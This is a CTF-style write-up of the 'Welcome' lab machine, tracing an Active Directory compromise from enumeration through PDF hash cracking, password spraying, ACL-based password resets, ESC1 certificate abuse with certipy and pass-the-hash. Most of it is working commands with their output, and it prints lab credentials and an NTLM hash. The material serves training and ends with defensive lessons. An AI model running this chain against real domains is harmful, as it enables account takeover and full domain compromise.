---
title: Welcome
categories: [HacksmarterLabs]
tags: [active-directory, ldap, smb, pdf-password-cracking, password-spraying, acl-abuse, adcs, esc1, certipy, certificate-based-authentication]
media_subpath: /images/hacksmarter_welcome/
image:
  path: 'https://images.coursestack.com/5bd7ccc3-aa90-4fed-a38c-673776231ed4/7332d3d7-783d-49f9-9189-f4486802c114'
---

## Summary

**Welcome** is a HacksmarterLabs Active Directory machine that demonstrates a comprehensive attack chain involving password-protected PDF extraction, password spraying, ACL abuse, and Active Directory Certificate Services (ADCS) exploitation. The attack begins with initial credentials for a low-privileged user. Through SMB share enumeration, we discover a password-protected PDF file containing default credentials. After cracking the PDF password, we perform password spraying to discover additional user accounts. By exploiting ACL permissions, we gain the ability to change passwords for service accounts. Finally, we exploit an ESC1 vulnerability in ADCS to obtain an Administrator certificate, enabling complete domain compromise through certificate-based authentication.

## Initial Access

### Provided Credentials

We start with credentials for the following account:
- **Username**: `e.hills`
- **Password**: `Il0vemyj0b2025!`

> This represents a realistic scenario where initial access is gained through social engineering, password reuse, or other initial compromise vectors.
{: .prompt-info}

## Initial Enumeration

### LDAP User Enumeration

We begin by enumerating domain users using LDAP:

```bash
nxc ldap $FQDN -u $USERAD -p $PASS --users-export users
```

```
LDAP        10.1.130.157    389    DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:WELCOME.local) (signing:None) (channel binding:Never)
LDAP        10.1.130.157    389    DC01             [+] WELCOME.local\e.hills:Il0vemyj0b2025!
LDAP        10.1.130.157    389    DC01             [*] Enumerated 11 domain users: WELCOME.local
Username                    Last PW Set       BadPW  Description
Administrator              2025-09-13 13:24:04 0     Built-in account for administering the computer/domain
Guest                      <never>             1     Built-in account for guest access to the computer/domain
krbtgt                     2025-09-13 13:40:39 1     Key Distribution Center Service Account
e.hills                    2025-09-13 17:41:15 1
j.crickets                 2025-09-13 17:43:53 1
e.blanch                   2025-09-13 17:49:13 1
i.park                      2025-11-06 12:11:53 0     IT Intern
j.johnson                   2025-09-13 17:58:15 1
a.harris                    2025-09-13 17:59:13 0
svc_ca                     2025-11-06 12:15:07 0
svc_web                     2025-09-13 18:40:40 1     Web Server in Progress
```

> The enumeration reveals several domain users including service accounts (`svc_ca`, `svc_web`) and regular user accounts. The presence of an IT Intern account (`i.park`) may be of interest for privilege escalation.
{: .prompt-tip}

### SMB Share Enumeration

We enumerate accessible SMB shares:

```bash
nxc smb $FQDN -u $USERAD -p $PASS --shares
```

```
SMB         10.1.130.157    445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:WELCOME.local) (signing:True) (SMBv1:False) (Null Auth:True)
SMB         10.1.130.157    445    DC01             [+] WELCOME.local\e.hills:Il0vemyj0b2025!
SMB         10.1.130.157    445    DC01             [*] Enumerated shares
Share           Permissions     Remark
-----           -----------     ------
ADMIN$                          Remote Admin
C$                              Default share
Human Resources READ
IPC$            READ            Remote IPC
NETLOGON        READ            Logon server share
SYSVOL          READ            Logon server share
```

> The `Human Resources` share is accessible with READ permissions. This may contain sensitive documents that could reveal credentials or other useful information.
{: .prompt-warning}

## PDF Password Cracking

### Accessing the Human Resources Share

We connect to the Human Resources share to explore its contents:

```bash
smbclient.py -dc-ip $IP $DOMAIN/$USERAD:$PASS@$FQDN
```

```bash
# use Human Resources
# ls
drw-rw-rw-          0  Sat Sep 13 20:21:16 2025 .
drw-rw-rw-          0  Sat Sep 13 17:11:19 2025 ..
-rw-rw-rw-      84715  Sat Sep 13 20:21:16 2025 Welcome 2025 Holiday Schedule.pdf
-rw-rw-rw-      81466  Sat Sep 13 20:21:16 2025 Welcome Benefits.pdf
-rw-rw-rw-      82644  Sat Sep 13 20:21:16 2025 Welcome Handbook Excerpts.pdf
-rw-rw-rw-      79823  Sat Sep 13 20:21:16 2025 Welcome Performance Review Guide.pdf
-rw-rw-rw-      89511  Sat Sep 13 20:21:16 2025 Welcome Start Guide.pdf
# mget *
```

We discover several PDF files, including a "Welcome Start Guide.pdf" which may contain onboarding information or default credentials.

### Extracting PDF Hash

The PDF files are password-protected. We extract the hash from the "Welcome Start Guide.pdf" file:

```bash
pdf2john.py "Welcome Start Guide.pdf" > pdf_hash
```

The extracted hash:

```
$pdf$4*4*128*-1060*1*16*fc591b1749ad08498b60ce3a81947b8c*32*9abeeb4695a10ac7b5e6558d39ee8c8300000000000000000000000000000000*32*e3e7eecc056a1ca2a2b0298352b0970f96ff1503022a1146e322e2f215dfd6be
```

![PDF Password Protected](file-20251106175859540.png)

### Cracking the PDF Password

We use `hashcat` to crack the PDF password:

```bash
hashcat pdf_hash /opt/rockyou.txt
```

Hashcat automatically detects the hash type as PDF 1.4 - 1.6 (Acrobat 5 - 8):

```
10500 | PDF 1.4 - 1.6 (Acrobat 5 - 8) | Document
```

The password is successfully cracked:

```
$pdf$4*4*128*-1060*1*16*fc591b1749ad08498b60ce3a81947b8c*32*9abeeb4695a10ac7b5e6558d39ee8c8300000000000000000000000000000000*32*e3e7eecc056a1ca2a2b0298352b0970f96ff1503022a1146e322e2f215dfd6be:humanresources
```

> The PDF password is `humanresources`. This is a weak password that could have been easily guessed or found in a wordlist.
{: .prompt-warning}

### Extracting Default Credentials

After opening the PDF with the password, we discover default credentials:

![Welcome Start Guide PDF Contents](file-20251106175959789.png)

The document reveals a default password: `Welcome2025!@`

> **Critical Discovery**: The Welcome Start Guide PDF contains default credentials (`Welcome2025!@`) that may be used across multiple accounts in the domain. This is a common security issue where default passwords are documented and shared.
{: .prompt-danger}

## Password Spraying Attack

### Performing Password Spray

Using the discovered default password, we perform a password spray attack against all enumerated users:

```bash
nxc ldap $FQDN -u users -p 'Welcome2025!@' --continue-on-success
```

> Command breakdown:
>- `nxc ldap` : NetExec LDAP module
>- `-u users` : Use the users file from previous enumeration
>- `-p 'Welcome2025!@'` : The default password discovered in the PDF
>- `--continue-on-success` : Continue testing even after finding a match
{: .prompt-info}

The password spray reveals that `a.harris` uses the default password:

```
LDAP        10.1.130.157    389    DC01             [-] WELCOME.local\Administrator:Welcome2025!@
LDAP        10.1.130.157    389    DC01             [-] WELCOME.local\Guest:Welcome2025!@
LDAP        10.1.130.157    389    DC01             [-] WELCOME.local\krbtgt:Welcome2025!@
LDAP        10.1.130.157    389    DC01             [-] WELCOME.local\e.hills:Welcome2025!@
LDAP        10.1.130.157    389    DC01             [-] WELCOME.local\j.crickets:Welcome2025!@
LDAP        10.1.130.157    389    DC01             [-] WELCOME.local\e.blanch:Welcome2025!@
LDAP        10.1.130.157    389    DC01             [-] WELCOME.local\i.park:Welcome2025!@
LDAP        10.1.130.157    389    DC01             [-] WELCOME.local\j.johnson:Welcome2025!@
LDAP        10.1.130.157    389    DC01             [+] WELCOME.local\a.harris:Welcome2025!@
LDAP        10.1.130.157    389    DC01             [-] WELCOME.local\svc_ca:Welcome2025!@
LDAP        10.1.130.157    389    DC01             [-] WELCOME.local\svc_web:Welcome2025!@
```

> **Password Spray Success**: The account `a.harris` uses the default password `Welcome2025!@`. This gives us access to an additional user account that may have different permissions than our initial account.
{: .prompt-success}

## ACL Enumeration and Abuse

### Enumerating Writable Objects

Using `a.harris` credentials, we enumerate writable objects using `bloodyAD`:

```bash
bloodyAD --host $FQDN -d $DOMAIN -u $USERAD -p $PASS get writable
```

The enumeration reveals several writable objects:

```
distinguishedName: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=WELCOME,DC=local
permission: WRITE

distinguishedName: CN=Ian Park,CN=Users,DC=WELCOME,DC=local
permission: CREATE_CHILD; WRITE
OWNER: WRITE
DACL: WRITE

distinguishedName: CN=Alice Harris,CN=Users,DC=WELCOME,DC=local
permission: WRITE
```

> **Critical Discovery**: We have `WRITE`, `CREATE_CHILD`, `OWNER`, and `DACL` permissions over `CN=Ian Park,CN=Users,DC=WELCOME,DC=local`. This combination of permissions is equivalent to **GenericAll**, which allows us to modify any attribute of the object, including the password.
{: .prompt-warning}

### Changing Ian Park's Password

Since we have GenericAll permissions over `i.park`, we can change his password:

```bash
bloodyAD --host $FQDN -d $DOMAIN -u $USERAD -p $PASS set password i.park 'P@$$word123!'
```

```
[+] Password changed successfully!
```

> We successfully changed `i.park`'s password. This gives us access to the IT Intern account, which may have additional privileges or access to different resources.
{: .prompt-success}

### Changing Service Account Passwords

Using `i.park` credentials, we can also change passwords for service accounts. We change the passwords for `svc_ca` and `svc_web`:

![Changing Service Account Passwords](file-20251106180747075.png)

```bash
bloodyAD --host $FQDN -d $DOMAIN -u $USERAD -p $PASS set password svc_ca 'P@$$word123!'
```

```
[+] Password changed successfully!
```

> **Service Account Compromise**: By changing the `svc_ca` password, we gain access to the service account used for Active Directory Certificate Services. This is critical as `svc_ca` may have enrollment rights on certificate templates.
{: .prompt-danger}

## Active Directory Certificate Services (ADCS) Exploitation

### Enumerating Certificate Templates

Using `svc_ca` credentials, we enumerate certificate templates using `certipy`:

```bash
certipy find -dc-ip $IP -target $FQDN -u $USERAD@$FQDN -p $PASS -enabled -hide-admins -stdout -vulnerable
```

The enumeration reveals a vulnerable certificate template:

```
Certificate Authorities
  0
    CA Name                             : WELCOME-CA
    DNS Name                            : DC01.WELCOME.local
    Certificate Subject                 : CN=WELCOME-CA, DC=WELCOME, DC=local
    Certificate Serial Number           : 6E7A025A45F4E6A14E1F08B77737AFD9
    Certificate Validity Start          : 2025-09-13 16:39:33+00:00
    Certificate Validity End            : 2030-09-13 16:49:33+00:00
    Permissions
      Access Rights
        Enroll                          : WELCOME.LOCAL\Authenticated Users

Certificate Templates
  0
    Template Name                       : Welcome-Template
    Display Name                        : Welcome-Template
    Certificate Authorities             : WELCOME-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Enrollment Flag                     : PublishToDs
    Extended Key Usage                  : Server Authentication
                                          Client Authentication
    Permissions
      Enrollment Permissions
        Enrollment Rights               : WELCOME.LOCAL\svc ca
    [+] User Enrollable Principals      : WELCOME.LOCAL\svc ca
    [!] Vulnerabilities
      ESC1                              : Enrollee supplies subject and template allows client authentication.
```

> **ESC1 Vulnerability Discovered**: The `Welcome-Template` certificate template is vulnerable to ESC1 (Enrollee Supplies Subject). This vulnerability occurs when:
> - The template allows the enrollee to supply the subject (Enrollee Supplies Subject = True)
> - The template allows client authentication (Client Authentication in Extended Key Usage)
> - We have enrollment rights (which we do as `svc_ca`)
> 
> This allows us to request a certificate for any user, including the Administrator account.
{: .prompt-danger}

### Exploiting ESC1 Vulnerability

To exploit ESC1, we need the domain SID. We retrieve it using `lookupsid.py`:

```bash
lookupsid.py $DOMAIN/$USERAD:$PASS@$FQDN -domain-sids 0
```

```
[*] Domain SID is: S-1-5-21-141921413-1529318470-1830575104
```

Now we request a certificate for the Administrator account:

```bash
certipy req \
    -u $USERAD@$DOMAIN -p $PASS \
    -dc-ip $IP -target $FQDN \
    -ca 'WELCOME-CA' -template 'Welcome-Template' \
    -upn administrator@$DOMAIN -sid S-1-5-21-141921413-1529318470-1830575104-500
```

> Command breakdown:
>- `certipy req` : Request a certificate
>- `-u $USERAD@$DOMAIN -p $PASS` : Authenticate as svc_ca
>- `-dc-ip $IP -target $FQDN` : Domain controller information
>- `-ca 'WELCOME-CA'` : Certificate Authority name
>- `-template 'Welcome-Template'` : Vulnerable template
>- `-upn administrator@$DOMAIN` : Request certificate for Administrator
>- `-sid S-1-5-21-141921413-1529318470-1830575104-500` : Administrator's SID (RID 500)
{: .prompt-info}

The certificate request is successful:

```
[*] Requesting certificate via RPC
[*] Request ID is 22
[*] Successfully requested certificate
[*] Got certificate with UPN 'administrator@WELCOME.local'
[*] Certificate object SID is 'S-1-5-21-141921413-1529318470-1830575104-500'
[*] Saving certificate and private key to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx'
```

### Authenticating with Certificate

We use the certificate to authenticate and extract the NTLM hash:

```bash
certipy auth -pfx administrator.pfx -dc-ip $IP
```

```
[*] Certificate identities:
[*]     SAN UPN: 'administrator@WELCOME.local'
[*]     SAN URL SID: 'S-1-5-21-141921413-1529318470-1830575104-500'
[*] Using principal: 'administrator@welcome.local'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'administrator.ccache'
[*] Wrote credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@welcome.local': aad3b435b51404eeaad3b435b51404ee:0cf1b799460a39c852068b7c0574677a
```

> **Domain Compromise**: We successfully obtained the Administrator NTLM hash (`0cf1b799460a39c852068b7c0574677a`) through certificate-based authentication. This enables complete domain access.
{: .prompt-danger}

## Domain Compromise

### Accessing Administrator Shares

Using the Administrator hash, we can access the domain controller:

```bash
smbclient.py -hashes ':0cf1b799460a39c852068b7c0574677a' $DOMAIN/Administrator@$FQDN
```

We navigate to the Administrator's Desktop to retrieve the root flag:

```bash
# use C$
# cd Users\Administrator\Desktop
# ls
-rw-rw-rw-         32  Sat Sep 13 21:50:19 2025 root.txt
# get root.txt
```

We also retrieve the user flag from `a.harris`'s Desktop:

```bash
# cd ..\a.harris\desktop
# ls
-rw-rw-rw-         32  Sat Sep 14 00:48:14 2025 user.txt
# get user.txt
```

## Conclusion

### Quick Recap

- Initial access was provided through credentials for `e.hills`
- SMB share enumeration revealed password-protected PDF files in the Human Resources share
- PDF password was cracked, revealing default credentials
- Password spraying discovered that `a.harris` used the default password
- ACL enumeration revealed GenericAll permissions over `i.park`
- Password changes were performed on `i.park` and service accounts
- ADCS enumeration revealed an ESC1 vulnerability in the Welcome-Template
- ESC1 was exploited to obtain an Administrator certificate
- Certificate-based authentication provided Administrator NTLM hash
- Complete domain compromise was achieved

### Lessons Learned

- **Default Credentials**: Default passwords should never be documented in accessible files or shared across accounts
- **Password Policies**: Strong password policies should prevent the use of default or easily guessable passwords
- **Access Control Lists**: Proper ACL management is critical to prevent unauthorized password changes
- **ADCS Security**: Certificate templates should be properly configured to prevent ESC1 and other vulnerabilities
- **Enrollee Supplies Subject**: Templates allowing enrollees to supply the subject should have strict enrollment controls
- **Service Account Security**: Service accounts with certificate enrollment rights should be carefully protected
- **Information Disclosure**: Sensitive documents should not be stored in publicly accessible shares
- **Defense in Depth**: Multiple security controls should protect critical systems and credentials
